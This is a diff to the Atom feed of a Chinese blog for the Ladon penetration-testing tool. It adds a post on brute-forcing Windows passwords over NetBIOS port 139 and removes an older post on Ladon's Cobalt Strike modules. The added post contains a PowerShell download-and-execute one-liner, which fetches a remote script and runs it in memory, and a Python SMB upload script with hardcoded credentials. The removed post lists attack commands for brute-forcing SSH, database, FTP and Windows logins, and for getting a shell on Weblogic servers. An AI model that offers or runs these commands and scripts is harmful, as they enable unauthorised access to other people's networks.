@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://k8gege.org/"/>
-  <updated>2020-07-18T04:07:00.638Z</updated>
+  <updated>2020-08-01T08:41:32.283Z</updated>
   <id>http://k8gege.org/</id>
   
   <author>
@@ -15,6 +15,41 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>NbtScan 139端口弱口令/Netbios密码爆破</title>
+    <link href="http://k8gege.org/p/NbtScan.html"/>
+    <id>http://k8gege.org/p/NbtScan.html</id>
+    <published>2020-08-01T07:20:00.000Z</published>
+    <updated>2020-08-01T08:41:32.283Z</updated>
+    
+    <content type="html"><![CDATA[<p style="color:#fff;"> <% <span class="archive-article-date">Visit <span id="busuanzi_value_page_pv"></span>%></%></p><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>Ladon &gt;= 7.1</p><h3 id="139端口"><a href="#139端口" class="headerlink" title="139端口"></a>139端口</h3><p>NetBIOS File and Print Sharing 通过这个端口进入的连接试图获得NetBIOS/SMB服务。这个协议被用于Windows”文件和打印机共享”和SAMBA。</p><h3 id="IPC-通信"><a href="#IPC-通信" class="headerlink" title="IPC$通信"></a>IPC$通信</h3><p>Windows系统中的net use ipc$整个通信过程，先445-&gt;137-&gt;139验证，当你开启防火墙禁用445，发现系统命令就无法连接IPC了，根本没机会走到139，所以使用系统自带命令连接的ipc$需要同时开启这些端口。说入侵139就是IPC$的说法是错误的，就像说wmiexec.vbs可完全替代PSEXEC工具一样，这个脚本需要目标开启135和445，因为它通过445来传输结果，意味着目标只开放135这个VBS的回显就没有了，其实假设目标只开放445，这个VBS脚本还能执行命令吗？哪来的替代或扔掉？这个系统的IPC$连接也是同理，测试首先得把其它端口禁了再说话。虽然系统自带命令需要同时开启，但是 自己实现SMB服务器的话是可以只使用139或只用445端口的，详情参考impacket。</p><h3 id="Nbt爆破"><a href="#Nbt爆破" class="headerlink" title="Nbt爆破"></a>Nbt爆破</h3><p>系统自带命令需要同时开启139和445，但是 自己实现SMB服务器的话是可以只使用139或只用445端口的。系统的IPC$就像读取系统密码一样，可以先植入CS再用MIMI插件读取，但是我们也可以不使用CS，直接MIMI读取密码啊。基于和MIMI可以独立读取密码的原理，反向思路我们也可以完全不走445，直接通过139验证WINDOWS密码，所以这个和IPC$不一样(指的是系统命令连接的ipc)，所以为了防止大家误解，起名为NbtScan。毕竟走的也是Netbios，系统IPC$验证一是时间非常久，且必须开启445，如果445都开了为何不用SmbScan验证密码呢？但是由于近几年勒索病毒横行，可能很多机器默认会关闭445，所以会导致无法通过445验证密码，但是没关系还有139啊。</p><h3 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h3><h5 id="139端口-Netbios密码爆破-Windows"><a href="#139端口-Netbios密码爆破-Windows" class="headerlink" title="139端口 Netbios密码爆破(Windows)"></a>139端口 Netbios密码爆破(Windows)</h5><p>Ladon 192.168.1.8/24 NbtScan<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/NbtScan.PNG"></p><h3 id="PowerLadon"><a href="#PowerLadon" class="headerlink" title="PowerLadon"></a>PowerLadon</h3><h4 id="远程加载NbtScan-139端口弱口令爆破"><a href="#远程加载NbtScan-139端口弱口令爆破" class="headerlink" title="远程加载NbtScan 139端口弱口令爆破"></a>远程加载NbtScan 139端口弱口令爆破</h4><p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.1.3:800/Ladon7.1_all.ps1&#39;" target="_blank" rel="noopener">http://192.168.1.3:800/Ladon7.1_all.ps1&#39;</a>); Ladon 192.168.1.141 NbtScan”</p><h3 id="139传输文件"><a href="#139传输文件" class="headerlink" title="139传输文件"></a>139传输文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> smb.SMBConnection <span class="keyword">import</span> SMBConnection</span><br><span class="line"><span class="keyword">from</span> nmb.NetBIOS <span class="keyword">import</span> NetBIOS</span><br><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getBIOSName</span><span class="params">(remote_smb_ip, timeout=<span class="number">30</span>)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bios = NetBIOS()</span><br><span class="line">        srv_name = bios.queryIPForName(remote_smb_ip, timeout=timeout)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, <span class="string">"Looking up timeout, check remote_smb_ip again!!"</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        bios.close()</span><br><span class="line">        <span class="keyword">return</span> srv_name</span><br><span class="line">serverip=<span class="string">'192.168.1.40'</span></span><br><span class="line">conn = SMBConnection(<span class="string">'k8gege'</span>, <span class="string">'k8gege520'</span>, <span class="string">'C$'</span>,getBIOSName(serverip)[<span class="number">0</span>], use_ntlm_v2 = <span class="literal">True</span>) </span><br><span class="line"><span class="keyword">assert</span> conn.connect(serverip, <span class="number">139</span>)</span><br><span class="line"><span class="comment">#temdir='/'</span></span><br><span class="line"><span class="comment">#dir=os.path.join('/','public')</span></span><br><span class="line">f = open(<span class="string">'C:/123.txt'</span>, <span class="string">'rb'</span>)</span><br><span class="line">conn.storeFile(<span class="string">'Users'</span>,<span class="string">'234.txt'</span>,f)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p style=&quot;color:#fff;&quot;&gt; 
+&lt;% &lt;span class=&quot;archive-article-date&quot;&gt;
+Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
+
+%&gt;
+&lt;/%&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;版本&quot;&gt;&lt;a
+      
+    
+    </summary>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+      <category term="netbios" scheme="http://k8gege.org/tags/netbios/"/>
+    
+  </entry>
   
   <entry>
     <title>〖教程〗Ladon Socks代理扫描(附Proxifier4.0注册码)</title>
@@ -300,9 +335,9 @@
     
       <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
-      <category term="远程执行" scheme="http://k8gege.org/categories/Rce/"/>
-    
       <category term="密码爆破" scheme="http://k8gege.org/categories/Brute-Force/"/>
+    
+      <category term="远程执行" scheme="http://k8gege.org/categories/Rce/"/>
     
     
       <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
@@ -513,11 +548,11 @@
     
       <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
+      <category term="主机发现" scheme="http://k8gege.org/categories/OnlinePC/"/>
+    
       <category term="内网渗透" scheme="http://k8gege.org/categories/Lan-Pentest/"/>
     
       <category term="信息收集" scheme="http://k8gege.org/categories/Discover/"/>
-    
-      <category term="主机发现" scheme="http://k8gege.org/categories/OnlinePC/"/>
     
     
       <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
@@ -543,11 +578,11 @@
     </summary>
     
     
-      <category term="Kali" scheme="http://k8gege.org/categories/Kali/"/>
-    
       <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
       <category term="密码" scheme="http://k8gege.org/categories/Pass/"/>
+    
+      <category term="Kali" scheme="http://k8gege.org/categories/Kali/"/>
     
     
       <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
@@ -582,9 +617,9 @@
     
       <category term="工具" scheme="http://k8gege.org/categories/Tool/"/>
     
-      <category term="Kali" scheme="http://k8gege.org/categories/Kali/"/>
-    
       <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+      <category term="Kali" scheme="http://k8gege.org/categories/Kali/"/>
     
     
       <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
@@ -594,38 +629,6 @@
       <category term="Kali" scheme="http://k8gege.org/tags/Kali/"/>
     
       <category term="Scanner" scheme="http://k8gege.org/tags/Scanner/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Ladon For Cobalt Strike 4.0</title>
-    <link href="http://k8gege.org/p/c5430395.html"/>
-    <id>http://k8gege.org/p/c5430395.html</id>
-    <published>2020-03-29T16:11:00.000Z</published>
-    <updated>2020-06-04T12:32:02.897Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Ladon 6.2支持Cobalt Strike 4.0,内置58个功能<br>加载脚本Ladon.cna,通过Beacon命令或右键使用</p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>CS命令行下扫描目标内网,无需代理转发扫描收集信息、密码爆破等<br>跳板扫描外网资产(即无需代理直接通过在控机器扫描其它目标资产)</p><h3 id="Ladon右键菜单"><a href="#Ladon右键菜单" class="headerlink" title="Ladon右键菜单"></a>Ladon右键菜单</h3><p>相比Beacon命令行，GUI就更简单了，只需填写IP、URL等，一键扫描</p><p>主菜单<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_Ladon.PNG"><br>资产扫描<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_LadonDiscover.PNG"><br>漏洞检测<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_LadonVulScan.PNG"><br>密码爆破<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_LadonBrute.PNG"><br>网络嗅探<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_LadonSinfiier.PNG"><br>信息收集<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_LadonGetinfo.PNG"></p><p>例子：WmiHash密码爆破<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/WmiHash.PNG"></p><h3 id="Beacon命令帮助"><a href="#Beacon命令帮助" class="headerlink" title="Beacon命令帮助"></a>Beacon命令帮助</h3><p>Example: Ladon help</p><p><img alt data-original="http://k8gege.org/k8img/Ladon/CS_Ladon.gif"></p><h3 id="1-MS17010-MS17-010漏洞扫描"><a href="#1-MS17010-MS17-010漏洞扫描" class="headerlink" title="1.MS17010 MS17-010漏洞扫描"></a>1.MS17010 MS17-010漏洞扫描</h3><p>Example: Ladon 192.168.1.8/24 MS17010<br>结果:IP、SMB漏洞、机器名、操作系统版本<br><img alt="MS17010" data-original="http://k8gege.org/k8img/Ladon/cs/CS_MS17010.gif"></p><h3 id="2-OSscan-操作系统探测"><a href="#2-OSscan-操作系统探测" class="headerlink" title="2.OSscan 操作系统探测"></a>2.OSscan 操作系统探测</h3><p>Example: Ladon 192.168.1.8/24 OSscan<br>通过SMB、多端口、Banner等方式探测（存活主机、主机名、域名、操作系统版本、开放服务等）<br><img alt="OSscan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_OSscan.gif"></p><h3 id="3-OnlinePC-存活主机扫描"><a href="#3-OnlinePC-存活主机扫描" class="headerlink" title="3.OnlinePC 存活主机扫描"></a>3.OnlinePC 存活主机扫描</h3><p>Example: Ladon 192.168.1.8/24 OnlinePC<br>也支持检测主机名/域名是否存活,结果IP、Mac、机器名<br><img alt="OnlinePC" data-original="http://k8gege.org/k8img/Ladon/cs/CS_OnlinePC.gif"></p><h3 id="4-WebScan-Web扫描"><a href="#4-WebScan-Web扫描" class="headerlink" title="4.WebScan Web扫描"></a>4.WebScan Web扫描</h3><p>Example: Ladon 192.168.1.8/24 WebScan<br>内网站点扫描，获取服务器Banner、网页标题<br><img alt="WebScan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_WebScan.gif"></p><h3 id="5-FtpScan-FTP密码扫描"><a href="#5-FtpScan-FTP密码扫描" class="headerlink" title="5.FtpScan FTP密码扫描"></a>5.FtpScan FTP密码扫描</h3><p>Example: Ladon 192.168.1.8/24 FtpScan<br>需上传user.txt和pass.txt至beacon工作目录<br><img alt="FtpScan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_FtpScan.gif"></p><h3 id="6-WmiScan-Win方式爆破Windows密码（IPC被拒绝时可尝试WMI）"><a href="#6-WmiScan-Win方式爆破Windows密码（IPC被拒绝时可尝试WMI）" class="headerlink" title="6.WmiScan Win方式爆破Windows密码（IPC被拒绝时可尝试WMI）"></a>6.WmiScan Win方式爆破Windows密码（IPC被拒绝时可尝试WMI）</h3><p>Example: Ladon 192.168.1.8/24 WmiScan<br>Wmi方式批量爆破内网主机帐密,需上传user.txt和pass.txt至工作目录<br><img alt="WmiScan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_WmiScan.gif"></p><h3 id="7-CiscoScan-思科设备扫描"><a href="#7-CiscoScan-思科设备扫描" class="headerlink" title="7.CiscoScan 思科设备扫描"></a>7.CiscoScan 思科设备扫描</h3><p>Example: Ladon 192.168.1.8/24 CiscoScan<br>(IP、设备型号、主机名、Boot、硬件版本)<br><img alt="CiscoScan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_CiscoScan.gif"></p><h3 id="8-UrlScan-C段域名URL扫描"><a href="#8-UrlScan-C段域名URL扫描" class="headerlink" title="8.UrlScan C段域名URL扫描"></a>8.UrlScan C段域名URL扫描</h3><p>Example: Ladon 192.168.1.8/24 UrlScan<br>通过源码获取域名或URL，但不验证IP,适用于内网扫描时，目标域名指向外网IP<br>或者通过域名判断内网站点是何产品，比如出现cisco.com域名，说明此为cisco设备<br><img alt="UrlScan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_UrlScan.gif"></p><h3 id="9-SameWeb-C段旁站扫描"><a href="#9-SameWeb-C段旁站扫描" class="headerlink" title="9.SameWeb C段旁站扫描"></a>9.SameWeb C段旁站扫描</h3><p>Example: Ladon 192.168.1.8/24 SameWeb<br>通过源码获取域名并验证IP，返回正确的同服站点,非bing或爱站等方式,即内网不可上网也可扫描<br>验证IP主要适用于，外网扫描时旁站，因为获取的域名指向外网时，无法通过IP判断是否属于同服<br><img alt="SameWeb" data-original="http://k8gege.org/k8img/Ladon/cs/CS_SameWeb.gif"></p><h3 id="10-WeblogicExp-amp-WeblogicPoc"><a href="#10-WeblogicExp-amp-WeblogicPoc" class="headerlink" title="10.WeblogicExp &amp; WeblogicPoc"></a>10.WeblogicExp &amp; WeblogicPoc</h3><p>Example: Ladon 192.168.1.8/24 WeblogicPoc<br>Example: Ladon 192.168.1.8/24 WeblogicExp<br>Weblogic漏洞扫描两个模块,一个是只扫描是否存在漏洞，另一个是扫描并且GetShell<br><img alt="WeblogicExp" data-original="http://k8gege.org/k8img/Ladon/cs/CS_WeblogicExp.gif"></p><h3 id="11-EnumMSSQL-枚举局域网MS-SQL-SERVER数据库主机"><a href="#11-EnumMSSQL-枚举局域网MS-SQL-SERVER数据库主机" class="headerlink" title="11.EnumMSSQL 枚举局域网MS SQL SERVER数据库主机"></a>11.EnumMSSQL 枚举局域网MS SQL SERVER数据库主机</h3><p>Example: Ladon 192.168.1.8/24 EnumMSSQL<br>和PowerUpSql一样不一定能获取到SQL版本<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_EnumMSSQL.gif"></p><h3 id="12-EnumShare-枚举局域网共享资源"><a href="#12-EnumShare-枚举局域网共享资源" class="headerlink" title="12.EnumShare 枚举局域网共享资源"></a>12.EnumShare 枚举局域网共享资源</h3><p>Example: Ladon 192.168.1.8/24 EnumShare<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_EnumShare.gif"></p><h3 id="13-MssqlScan-MSSQL数据库密码爆破"><a href="#13-MssqlScan-MSSQL数据库密码爆破" class="headerlink" title="13.MssqlScan MSSQL数据库密码爆破"></a>13.MssqlScan MSSQL数据库密码爆破</h3><p>Example: Ladon 192.168.1.8/24 MssqlScan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_MssqlScan.gif"></p><h3 id="14-MysqlScan-MySQL数据库密码爆破"><a href="#14-MysqlScan-MySQL数据库密码爆破" class="headerlink" title="14.MysqlScan MySQL数据库密码爆破"></a>14.MysqlScan MySQL数据库密码爆破</h3><p>Example: Ladon 192.168.1.8/24 MysqlScan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_MysqlScan.gif"></p><h3 id="15-SSHscan-SSH主机密码爆破"><a href="#15-SSHscan-SSH主机密码爆破" class="headerlink" title="15.SSHscan SSH主机密码爆破"></a>15.SSHscan SSH主机密码爆破</h3><p>Example: Ladon 192.168.1.8/24 SSHscan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_SSHscan.gif"></p><h3 id="16-OracleScan-Oracle数据库密码爆破"><a href="#16-OracleScan-Oracle数据库密码爆破" class="headerlink" title="16.OracleScan Oracle数据库密码爆破"></a>16.OracleScan Oracle数据库密码爆破</h3><p>Example: Ladon 192.168.1.8/24 OracleScan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_OracleScan.gif"></p><h3 id="17-HostIP-域名解析-主机名转IP"><a href="#17-HostIP-域名解析-主机名转IP" class="headerlink" title="17.HostIP 域名解析/主机名转IP"></a>17.HostIP 域名解析/主机名转IP</h3><p>Example: Ladon 192.168.1.8/24 HostIP<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_HostIP.gif"></p><h3 id="18-WhatCMS-Web指纹识别支持75种"><a href="#18-WhatCMS-Web指纹识别支持75种" class="headerlink" title="18.WhatCMS Web指纹识别支持75种"></a>18.WhatCMS Web指纹识别支持75种</h3><p>Example: Ladon 192.168.1.8/24 WhatCMS<br>url.txt指定站点或批量站点扫描,也可扫描整个C段部分web端口对应CMS<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_WhatCMS.gif"></p><h3 id="19-IpcScan-Windows密码爆破-Wmi被拒绝时可尝试Ipc"><a href="#19-IpcScan-Windows密码爆破-Wmi被拒绝时可尝试Ipc" class="headerlink" title="19.IpcScan Windows密码爆破(Wmi被拒绝时可尝试Ipc)"></a>19.IpcScan Windows密码爆破(Wmi被拒绝时可尝试Ipc)</h3><p>Example: Ladon 192.168.1.8/24 IpcScan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_IpcScan.gif"></p><h3 id="21-EnBase64-DeBase64-Base64密码批量加密解密"><a href="#21-EnBase64-DeBase64-Base64密码批量加密解密" class="headerlink" title="21.EnBase64/DeBase64  Base64密码批量加密解密"></a>21.EnBase64/DeBase64  Base64密码批量加密解密</h3><p>Example: Ladon 明文字符串 EnBase64<br>Example: Ladon Base64内容 DeBase64<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_Base64.gif"></p><h3 id="22-EnHex-DeHex-Hex密码批量加密解密-3种格式"><a href="#22-EnHex-DeHex-Hex密码批量加密解密-3种格式" class="headerlink" title="22.EnHex/DeHex  Hex密码批量加密解密(3种格式)"></a>22.EnHex/DeHex  Hex密码批量加密解密(3种格式)</h3><p>Example: Ladon 明文字符串 EnHex<br>Example: Ladon 16进制内容 EnHex<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_DeHex.gif"></p><h3 id="23-SmbScan-Windows密码爆破-Wmi被拒绝时可尝试-记录错误日志"><a href="#23-SmbScan-Windows密码爆破-Wmi被拒绝时可尝试-记录错误日志" class="headerlink" title="23.SmbScan Windows密码爆破(Wmi被拒绝时可尝试,记录错误日志)"></a>23.SmbScan Windows密码爆破(Wmi被拒绝时可尝试,记录错误日志)</h3><p>Example: Ladon 192.168.1.8/24 SmbScan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_SmbScan.gif"></p><h3 id="24-PhpStudyPoc-PhpStudy后门检测"><a href="#24-PhpStudyPoc-PhpStudy后门检测" class="headerlink" title="24.PhpStudyPoc PhpStudy后门检测"></a>24.PhpStudyPoc PhpStudy后门检测</h3><p>Example: Ladon 192.168.1.8/24 PhpStudyPoc<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_PhpStudyPoc.gif"></p><h3 id="25-DomainIP-域名解析"><a href="#25-DomainIP-域名解析" class="headerlink" title="25.DomainIP 域名解析"></a>25.DomainIP 域名解析</h3><p>Example: Ladon youdomain DomainIP<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_DomainIP.gif"></p><h3 id="26-SubDomain-子域名爆破"><a href="#26-SubDomain-子域名爆破" class="headerlink" title="26.SubDomain 子域名爆破"></a>26.SubDomain 子域名爆破</h3><p>Example: Ladon 192.168.1.8/24 SubDomain<br>需域名字典SubDomain.dic<br>例子: Ladon baidu.com SubDomain<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_SubDomain.gif"></p><h3 id="27-WebDir-Web目录扫描"><a href="#27-WebDir-Web目录扫描" class="headerlink" title="27.WebDir Web目录扫描"></a>27.WebDir Web目录扫描</h3><p>Example: Ladon <a href="http://youweb.com" target="_blank" rel="noopener">http://youweb.com</a> WebDir<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_WebDir.gif"></p><h3 id="28-ActiveMQPoc-ActiveMQ漏洞扫描"><a href="#28-ActiveMQPoc-ActiveMQ漏洞扫描" class="headerlink" title="28.ActiveMQPoc ActiveMQ漏洞扫描"></a>28.ActiveMQPoc ActiveMQ漏洞扫描</h3><p>Example: Ladon 192.168.1.8/24 ActiveMQPoc<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_ActiveMQPoc.gif"></p><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;Ladon 6.2支持Cobalt Strike 4.0,内置58个功能&lt;br&gt;加载脚本Ladon.cna,通过Beacon命令或右键使用&lt;
-      
-    
-    </summary>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
-      <category term="Cobalt Strike" scheme="http://k8gege.org/categories/CS/"/>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
-      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
-    
-      <category term="Cobalt Strike" scheme="http://k8gege.org/tags/CS/"/>
     
   </entry>
   
